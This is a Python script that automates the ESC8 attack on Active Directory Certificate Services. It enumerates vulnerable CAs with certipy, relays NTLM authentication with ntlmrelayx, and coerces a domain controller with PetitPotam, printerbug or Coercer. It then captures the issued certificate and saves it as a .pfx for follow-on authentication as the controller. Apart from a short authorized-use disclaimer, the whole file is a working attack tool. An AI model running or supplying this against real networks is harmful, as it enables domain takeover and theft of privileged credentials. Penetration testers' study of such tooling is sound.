#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Coercing/relaying authentication against systems without prior mutual written
# consent is illegal. It is the end user's responsibility to obey all laws.
"""ESC8 (NTLM relay to AD CS) orchestration helper.

Automates the three moving parts of an ESC8 attack in the correct order:
  1) enumerate AD CS for ESC8 with `certipy find -vulnerable`
  2) launch `ntlmrelayx --adcs` against the CA web-enrollment URL
  3) trigger coercion (PetitPotam / printerbug / Coercer) to a relay listener

It builds and runs the real upstream tool commands and parses ntlmrelayx
output for the captured base64 certificate. It does not reimplement the relay.
"""

import argparse
import base64
import binascii
import re
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

CERT_MARKER = "Base64 certificate of user"
B64_RE = re.compile(r"^[A-Za-z0-9+/=]{40,}$")


def find_tool(candidates):
    for name in candidates:
        path = shutil.which(name)
        if path:
            return path
    return None


def run_certipy_find(certipy, user, password, dc_ip, timeout):
    """Run certipy find and report whether ESC8 appears in the output."""
    cmd = [certipy, "find", "-u", user, "-p", password, "-dc-ip", dc_ip,
           "-vulnerable", "-enabled", "-stdout"]
    print(f"[*] enumerating AD CS: {' '.join(cmd[:2])} ... -vulnerable")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        print("[!] certipy find timed out", file=sys.stderr)
        return False, ""
    out = proc.stdout + proc.stderr
    vulnerable = "ESC8" in out
    print(f"[{'+' if vulnerable else '-'}] ESC8 {'FOUND' if vulnerable else 'not found'} in certipy output")
    return vulnerable, out


def stream_relay(relayx, ca_url, template, captured, stop_event):
    """Run ntlmrelayx --adcs and scan its stdout for the issued certificate."""
    cmd = [relayx, "-t", ca_url, "-smb2support", "--adcs", "--template", template]
    print(f"[*] starting relay: {' '.join(cmd)}")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
    except FileNotFoundError:
        print("[!] ntlmrelayx not found. Install: pipx install impacket", file=sys.stderr)
        stop_event.set()
        return
    grab_next = False
    for line in proc.stdout:
        line = line.rstrip()
        print(f"    [relay] {line}")
        if CERT_MARKER in line:
            grab_next = True
            continue
        if grab_next and B64_RE.match(line.strip()):
            captured.append(line.strip())
            grab_next = False
            stop_event.set()
            break
        if stop_event.is_set():
            break
    try:
        proc.terminate()
    except Exception:
        pass


def trigger_coercion(method, attacker_ip, dc_ip, user, password, domain, timeout):
    """Run the chosen coercion tool against the DC."""
    if method == "petitpotam":
        tool = find_tool(["PetitPotam.py", "petitpotam.py"])
        if not tool:
            print("[!] PetitPotam.py not found on PATH", file=sys.stderr)
            return
        cmd = ["python3", tool, "-u", user, "-p", password, "-d", domain,
               attacker_ip, dc_ip]
    elif method == "printerbug":
        tool = find_tool(["printerbug.py"])
        if not tool:
            print("[!] printerbug.py not found on PATH", file=sys.stderr)
            return
        cmd = ["python3", tool, f"{domain}/{user}:{password}@{dc_ip}", attacker_ip]
    elif method == "coercer":
        tool = find_tool(["coercer"])
        if not tool:
            print("[!] coercer not found. Install: pipx install coercer", file=sys.stderr)
            return
        cmd = [tool, "coerce", "-u", user, "-p", password, "-d", domain,
               "-l", attacker_ip, "-t", dc_ip]
    else:
        print(f"[!] unknown coercion method: {method}", file=sys.stderr)
        return
    print(f"[*] coercing DC {dc_ip} via {method}")
    try:
        subprocess.run(cmd, timeout=timeout)
    except subprocess.TimeoutExpired:
        print("[*] coercion command finished/timed out (expected)")


def save_pfx(b64, path):
    """Decode the captured base64 PKCS#12 blob to a .pfx file."""
    try:
        data = base64.b64decode(b64)
    except (binascii.Error, ValueError) as exc:
        print(f"[!] failed to decode certificate: {exc}", file=sys.stderr)
        return False
    with open(path, "wb") as fh:
        fh.write(data)
    print(f"[+] certificate written to {path} ({len(data)} bytes)")
    print(f"[+] next: certipy auth -pfx {path} -dc-ip <DC_IP>")
    return True


def main():
    parser = argparse.ArgumentParser(description="Authorized ESC8 orchestration helper")
    parser.add_argument("--ca-url", required=True,
                        help="CA web-enrollment URL, e.g. http://ca/certsrv/certfnsh.asp")
    parser.add_argument("--template", default="DomainController",
                        help="Certificate template to request")
    parser.add_argument("--attacker-ip", required=True, help="Relay listener IP")
    parser.add_argument("--dc-ip", required=True, help="Target DC IP to coerce")
    parser.add_argument("--user", required=True, help="Auth account for enum/coercion")
    parser.add_argument("--password", required=True, help="Account password")
    parser.add_argument("--domain", required=True, help="AD domain (FQDN)")
    parser.add_argument("--coerce", default="petitpotam",
                        choices=["petitpotam", "printerbug", "coercer"])
    parser.add_argument("--pfx-out", default="relayed.pfx", help="Output .pfx path")
    parser.add_argument("--skip-enum", action="store_true",
                        help="Skip certipy ESC8 enumeration")
    parser.add_argument("--timeout", type=int, default=120, help="Per-step timeout")
    args = parser.parse_args()

    print(f"[*] ESC8 helper — {datetime.now(timezone.utc).isoformat()}")
    print("[!] Authorized use only. Confirm rules-of-engagement.\n")

    if not args.skip_enum:
        certipy = find_tool(["certipy", "certipy-ad"])
        if certipy:
            run_certipy_find(certipy, f"{args.user}@{args.domain}", args.password,
                             args.dc_ip, args.timeout)
        else:
            print("[-] certipy not found; skipping enumeration "
                  "(install: pipx install certipy-ad)")

    relayx = find_tool(["impacket-ntlmrelayx", "ntlmrelayx.py"])
    if not relayx:
        print("[!] ntlmrelayx not found. Install: pipx install impacket", file=sys.stderr)
        sys.exit(2)

    captured = []
    stop_event = threading.Event()
    relay_thread = threading.Thread(
        target=stream_relay,
        args=(relayx, args.ca_url, args.template, captured, stop_event),
        daemon=True,
    )
    relay_thread.start()
    time.sleep(3)  # let the relay servers bind

    trigger_coercion(args.coerce, args.attacker_ip, args.dc_ip, args.user,
                     args.password, args.domain, args.timeout)

    # Wait for the relay thread to capture a certificate (bounded).
    relay_thread.join(timeout=args.timeout)

    if captured:
        save_pfx(captured[0], args.pfx_out)
        sys.exit(0)
    print("[-] No certificate captured. Verify coercion reached the relay and "
          "the template is enrollable.", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
